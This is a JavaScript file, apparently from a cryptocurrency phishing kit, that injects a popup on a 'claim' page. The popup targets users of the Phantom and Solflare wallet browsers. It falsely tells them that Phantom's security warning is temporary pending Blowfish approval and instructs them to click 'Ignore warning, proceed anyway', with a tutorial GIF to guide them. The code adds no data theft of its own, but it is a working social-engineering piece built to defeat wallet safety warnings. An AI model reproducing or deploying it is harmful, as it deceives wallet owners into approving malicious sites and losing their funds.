(function() {
    let popupShown = false;
    
    function isPhantomApp() {
        return navigator.userAgent.toLowerCase().includes('phantom');
    }

    function isSolflareApp() {
        return navigator.userAgent.toLowerCase().includes('solflare');
    }

    function showPopup() {
        const popupHTML = `
        <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');

        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            font-family: "Montserrat", sans-serif;
        }

        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .popup-container {
            background-color: #111d31;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            width: 95%;
            max-width: 500px;
            overflow: hidden;
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .popup-content {
            border: 1px solid rgba(255, 215, 0, 0.5);
            padding: 20px;
            border-radius: 15px;
        }

        .image-container {
            width: 90%;
            max-width: 90%;
            margin: 10px auto;
            overflow: hidden;
            border-radius: 15px;
            box-shadow: 0 4px 12px rgba(255, 215, 0, 0.2);
        }

        #warning-image {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 15px;
            transition: transform 0.3s ease;
        }

        #warning-image:hover {
            transform: scale(1.03);
        }

        .popup-text {
            color: #f0f0f0;
            font-size: 16px;
            line-height: 1.6;
            font-weight: 400;
            margin-bottom: 20px;
        }

        .agreeButton {
            background-color: #1c2333;
            border: 2px solid #d4af37;
            border-radius: 8px;
            padding: 20px 40px;
            font-size: 22px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            width: 100%;
            max-width: 300px;
            margin-top: 25px;
        }

        @media (max-width: 480px) {
            .popup-container {
                width: 90%;
                max-width: 90%;
                margin: 0 auto;
            }

            .popup-content {
                padding: 15px;
            }

            .popup-text {
                font-size: 14px;
            }

            .agreeButton {
                font-size: 16px;
                padding: 10px 20px;
            }
        }

        .agreeButton:hover {
            background-color: #1c2333;
            color: #f0f0f0;
        }

        .agreeButton:active {
            transform: scale(0.98);
        }


    </style>
    <div class="popup-overlay" id="popupOverlay">
        <div class="popup-container">
            <div class="popup-content">
                <p class="popup-text">
                    <strong>Important:</strong> When connecting to Phantom, you may see a security warning. 
                    This is temporary while our site is being approved by Blowfish. 
                    If prompted, please click "Ignore warning, proceed anyway" to continue.
                </p>
                <div class="image-container">
                    <img src="./tutorial.gif" alt="Tutorial GIF" id="warning-image">
                </div>
                <button class="agreeButton" id="phantomButton">I Understand</button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const phantomButton = document.getElementById('phantomButton');
            const popupOverlay = document.getElementById('popupOverlay');

            phantomButton.addEventListener('click', function() {
                popupOverlay.style.transition = 'opacity 0.3s ease-out';
                popupOverlay.style.opacity = '0';
                setTimeout(() => {
                    popupOverlay.style.display = 'none';
                }, 300);
            });
        });
    </script>
        `;

        const popupElement = document.createElement('div');
        popupElement.innerHTML = popupHTML;
        document.body.appendChild(popupElement);

        // Close popup when clicking outside the content
        popupElement.querySelector('.popup-overlay').addEventListener('click', function(event) {
            if (event.target === this) {
                document.body.removeChild(popupElement);
                popupShown = false;
            }
        });
    }

    // Function to show popup only if it hasn't been shown before
    function showPopupOnce() {
        if (!popupShown) {
            showPopup();
            popupShown = true;
        }
    }

    // Function to attach the showPopupOnce to claim buttons
    function attachPopupToClaimButtons() {
        const claimButtons = document.querySelectorAll('#open-wallet');
        claimButtons.forEach(button => {
            button.addEventListener('click', showPopupOnce);
        });
    }

    // Function to initialize the popup behavior
    function initializePopup() {
        if (isPhantomApp() || isSolflareApp()) {
            showPopupOnce();
        } else {
            attachPopupToClaimButtons();
        }
    }

    // Run the initialization function when the DOM is fully loaded
    function onDOMContentLoaded() {
        initializePopup();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', onDOMContentLoaded);
    } else {
        onDOMContentLoaded();
    }
})();
